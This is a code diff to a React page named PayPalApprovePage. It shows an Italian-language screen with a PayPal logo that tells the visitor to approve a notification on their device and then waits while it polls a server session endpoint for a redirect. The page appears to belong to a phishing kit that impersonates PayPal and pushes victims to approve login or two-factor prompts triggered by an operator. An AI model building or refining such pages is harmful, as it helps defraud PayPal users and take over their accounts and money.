@@ -1,7 +1,6 @@
 import { useState, useEffect } from "react";
 import { Card, CardContent } from "@/components/ui/card";
-import { Button } from "@/components/ui/button";
-import { CheckCircle } from "lucide-react";
+import { Smartphone, Loader2 } from "lucide-react";
 import { useRedirectPolling } from "@/hooks/use-redirect-polling";
 import paypalLogo from "@assets/generated_images/PayPal_official_logo_d33d02f7.png";
 
@@ -22,13 +21,6 @@ export default function PayPalApprovePage() {
     pathEndpoint: "/api/paypal/session/:sessionId/path",
   });
 
-  const handleContinue = () => {
-    const params = new URLSearchParams();
-    if (sessionId) params.set("session", sessionId);
-    const queryString = params.toString();
-    window.location.href = `/paypal/waiting${queryString ? `?${queryString}` : ""}`;
-  };
-
   return (
     <div className="min-h-screen bg-white flex flex-col">
       <div className="flex-1 flex items-center justify-center p-4">
@@ -38,34 +30,37 @@ export default function PayPalApprovePage() {
             <img src={paypalLogo} alt="PayPal" className="h-40 w-auto" data-testid="img-paypal-logo" />
           </div>
 
-          <Card className="border-2 border-green-500">
+          <Card className="border-2 border-blue-500">
             <CardContent className="pt-8 pb-8 px-8">
               <div className="space-y-6 text-center">
                 <div className="flex justify-center">
-                  <div className="bg-green-100 rounded-full p-4">
-                    <CheckCircle className="h-20 w-20 text-green-600" data-testid="icon-success" />
+                  <div className="bg-blue-100 rounded-full p-4">
+                    <Smartphone className="h-20 w-20 text-blue-600" data-testid="icon-device" />
                   </div>
                 </div>
                 
                 <div className="space-y-3">
                   <h2 className="text-2xl font-semibold text-gray-900" data-testid="text-title">
-                    Accesso approvato
+                    Verifica richiesta
                   </h2>
                   <p className="text-gray-600" data-testid="text-description">
-                    Il tuo accesso è stato approvato. Clicca continua per procedere.
+                    Controlla il tuo dispositivo e approva la notifica che hai ricevuto per continuare.
                   </p>
                 </div>
 
-                <Button
-                  onClick={handleContinue}
-                  className="w-full h-12 bg-[#0070ba] hover:bg-[#005ea6] text-white font-semibold rounded-full"
-                  data-testid="button-continue"
-                >
-                  Continua
-                </Button>
+                <div className="pt-4">
+                  <div className="flex justify-center items-center gap-2 text-blue-600">
+                    <Loader2 className="h-5 w-5 animate-spin" />
+                    <span className="text-sm font-medium">In attesa di approvazione...</span>
+                  </div>
+                </div>
               </div>
             </CardContent>
           </Card>
+
+          <div className="text-center text-sm text-gray-500">
+            <p data-testid="text-footer">Questa operazione potrebbe richiedere alcuni istanti</p>
+          </div>
         </div>
       </div>
     </div>
